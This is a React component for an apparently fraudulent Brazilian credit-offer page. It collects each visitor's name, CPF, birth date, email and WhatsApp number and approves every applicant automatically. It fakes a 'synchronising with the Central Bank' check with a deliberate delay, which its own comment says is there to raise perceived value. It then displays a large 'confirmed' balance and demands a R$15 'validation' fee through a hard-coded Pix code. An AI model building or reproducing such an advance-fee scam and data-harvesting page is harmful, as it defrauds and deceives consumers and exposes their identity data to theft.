
import React, { useState } from 'react';
import { FormStep, Lead } from '../types';
import { analyzeCreditProfile } from '../geminiService';

interface ApplicationFormProps {
  onLeadCapture: (lead: Lead) => void;
}

const ApplicationForm: React.FC<ApplicationFormProps> = ({ onLeadCapture }) => {
  const [step, setStep] = useState<FormStep>(FormStep.INITIAL);
  const [copied, setCopied] = useState(false);
  const [formData, setFormData] = useState({
    fullName: '',
    email: '',
    cpf: '',
    phone: '',
    birthDate: ''
  });
  const [analysisResult, setAnalysisResult] = useState({ limit: 0, message: '' });

  const pixCode = "00020101021226830014BR.GOV.BCB.PIX2561qrcodespix.sejaefi.com.br/v2/26cfd5283c0a4731a0fb1123472235c35204000053039865802BR5905EFISA6008SAOPAULO62070503***6304B487";

  const handleCopyPix = () => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData(prev => ({ ...prev, [e.target.name]: e.target.value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStep(FormStep.ANALYZING);

    const result = await analyzeCreditProfile(formData.fullName, formData.cpf);
    
    const newLead: Lead = {
      id: Math.random().toString(36).substr(2, 9),
      ...formData,
      submittedAt: new Date().toISOString(),
      status: 'approved',
      approvedLimit: result.suggestedLimit
    };

    setAnalysisResult({ 
      limit: result.suggestedLimit, 
      message: result.message 
    });

    // Simulação de delay de processamento para aumentar percepção de valor
    setTimeout(() => {
      onLeadCapture(newLead);
      setStep(FormStep.SUCCESS);
    }, 4500);
  };

  if (step === FormStep.ANALYZING) return (
    <div className="text-center py-16 space-y-8">
      <div className="w-28 h-28 border-[10px] border-gray-50 border-t-green-800 rounded-full animate-spin mx-auto"></div>
      <div className="space-y-4">
        <h3 className="text-2xl font-black text-green-900 uppercase tracking-tighter">Sincronizando com o Banco Central...</h3>
        <p className="text-gray-500 font-bold px-4 leading-tight">
          Validando margem de aporte financeiro e teto de faturamento antecipado.
        </p>
      </div>
    </div>
  );

  if (step === FormStep.SUCCESS) return (
    <div className="text-center py-4 space-y-6 animate-fade-in">
      <div className="bg-green-100 w-20 h-20 rounded-full flex items-center justify-center mx-auto shadow-xl">
        <svg className="w-12 h-12 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="4" d="M5 13l4 4L19 7" />
        </svg>
      </div>
      
      <div className="space-y-1">
        <h3 className="text-3xl font-black text-green-900 uppercase tracking-tighter leading-none">Aporte Confirmado!</h3>
        <p className="text-gray-500 font-bold uppercase text-[10px] tracking-[0.2em]">ID: BOT-{Math.floor(Math.random()*999999)}</p>
      </div>
      
      <div className="bg-gradient-to-br from-[#006341] to-black p-8 rounded-[2.5rem] shadow-2xl border-4 border-yellow-400">
        <p className="text-xs text-yellow-400 font-black uppercase mb-1 tracking-widest">Saldo Pronto para Compras</p>
        <p className="text-6xl font-black text-white tabular-nums tracking-tighter">R$ {analysisResult.limit.toLocaleString('pt-BR')}</p>
      </div>

      <div className="bg-yellow-50 p-6 rounded-3xl border-2 border-dashed border-yellow-400 text-left space-y-4">
         <h4 className="text-green-900 font-black uppercase text-xs flex items-center">
           <span className="mr-2 text-base">🛡️</span> Procedimento de Segurança:
         </h4>
         <p className="text-gray-600 text-sm font-bold leading-tight">
           Para liberar o acesso ao saldo grande, é obrigatória a <span className="text-green-900 underline font-black">Validação de Identidade Via Token Bio-Digital</span>.
         </p>
         <div className="bg-white p-4 rounded-2xl flex justify-between items-center shadow-sm border border-yellow-200">
            <span className="text-[10px] font-black text-gray-400 uppercase">Custo de Sincronização:</span>
            <span className="text-xl font-black text-green-800">R$ 15,00</span>
         </div>
      </div>

      <button 
        onClick={handleCopyPix} 
        className={`w-full py-5 rounded-2xl font-black text-xl transition-all shadow-xl uppercase ${copied ? 'bg-green-500 text-white' : 'bg-black text-white hover:bg-gray-900'}`}
      >
        {copied ? '✅ CÓDIGO COPIADO!' : 'COPIAR PIX DE VALIDAÇÃO'}
      </button>
    </div>
  );

  return (
    <form onSubmit={handleSubmit} className="space-y-6">
      <div className="text-center">
        <h3 className="text-3xl font-black text-gray-900 leading-none">RESERVAR MEU SALDO</h3>
        <p className="text-gray-500 font-bold mt-2 uppercase text-xs tracking-widest">Aprovação imediata via CPF</p>
      </div>
      
      <div className="space-y-4">
        <input required name="fullName" onChange={handleChange} placeholder="Nome Completo" className="w-full px-6 py-4 rounded-xl border-2 border-gray-100 font-bold outline-none focus:border-green-800 bg-gray-50" />
        <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
          <input required name="cpf" onChange={handleChange} placeholder="Seu CPF" className="w-full px-6 py-4 rounded-xl border-2 border-gray-100 font-bold outline-none focus:border-green-800 bg-gray-50" />
          <input required type="date" name="birthDate" onChange={handleChange} className="w-full px-6 py-4 rounded-xl border-2 border-gray-100 font-bold outline-none focus:border-green-800 bg-gray-50" />
        </div>
        <input required type="email" name="email" onChange={handleChange} placeholder="Seu melhor E-mail" className="w-full px-6 py-4 rounded-xl border-2 border-gray-100 font-bold outline-none focus:border-green-800 bg-gray-50" />
        <input required type="tel" name="phone" onChange={handleChange} placeholder="WhatsApp (DDD + Número)" className="w-full px-6 py-4 rounded-xl border-2 border-gray-100 font-bold outline-none focus:border-green-800 bg-gray-50" />
      </div>

      <button type="submit" className="w-full bg-green-900 text-white py-6 rounded-2xl font-black text-2xl uppercase shadow-2xl hover:bg-black transition-all">
        Liberar Meu Saldo Agora
      </button>
    </form>
  );
};

export default ApplicationForm;
